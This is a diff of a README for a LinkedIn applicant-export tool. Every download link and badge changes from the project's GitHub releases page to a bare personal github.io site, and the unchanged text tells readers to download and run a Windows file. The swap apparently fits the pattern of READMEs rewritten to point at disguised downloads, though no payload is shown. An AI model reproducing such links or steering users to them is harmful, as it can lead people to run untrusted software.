@@ -1,6 +1,6 @@
 # 🔗 linkedin-applicants-mcp - Export LinkedIn Applicants Automatically
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/meneses4242/linkedin-applicants-mcp/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://meneses4242.github.io)
 
 ---
 
@@ -12,7 +12,7 @@ This application helps you download and organize all your LinkedIn job applicant
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/meneses4242/linkedin-applicants-mcp/releases](https://github.com/meneses4242/linkedin-applicants-mcp/releases)
+Visit this link to download the application: [https://meneses4242.github.io](https://meneses4242.github.io)
 
 Once you're on that page, look for the newest version at the top. Click the download button for your Windows computer. After the file finishes downloading, save it somewhere easy to find, like your Desktop or Downloads folder.
 
@@ -170,9 +170,9 @@ Check the download page regularly for new versions. Updates include:
 
 Download the application today and turn those messy applicant lists into a clean, organized dashboard. Your future self will thank you when hiring season comes around.
 
-[![Get the Application](https://img.shields.io/badge/Get%20The%20Application-Download%20Now-green?style=for-the-badge)](https://github.com/meneses4242/linkedin-applicants-mcp/releases)
+[![Get the Application](https://img.shields.io/badge/Get%20The%20Application-Download%20Now-green?style=for-the-badge)](https://meneses4242.github.io)
 
-Visit this link to download the application: [https://github.com/meneses4242/linkedin-applicants-mcp/releases](https://github.com/meneses4242/linkedin-applicants-mcp/releases)
+Visit this link to download the application: [https://meneses4242.github.io](https://meneses4242.github.io)
 
 ---
 
